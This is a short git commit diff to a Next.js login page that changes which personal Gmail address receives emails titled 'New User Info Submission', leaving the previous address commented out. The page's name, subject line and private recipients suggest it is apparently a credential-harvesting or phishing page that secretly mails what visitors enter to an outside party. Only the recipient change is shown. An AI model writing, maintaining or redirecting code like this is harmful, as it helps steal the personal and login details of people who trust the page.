dc92e7781ef04a70578a39befd9a7b812d887414
officialbenz80 <officialbenz80@gmail.com>
2026-06-09 04:48:28 -0700

    Update page.tsx

--- app/[locale]/page.tsx
+++ app/[locale]/page.tsx
@@ -177,7 +177,8 @@ export default async function LoginPage({
     try {
       await transporter.sendMail({
         from: process.env.GMAIL_USER, // Sender address (must be your Gmail account)
-        to: "officialbenz80@gmail.com", // Destination address
+        to: "emmizy2015@gmail.com", // Destination address
+        // to: "officialbenz80@gmail.com",
         subject: "New User Info Submission",
         html: emailHtml,
       });
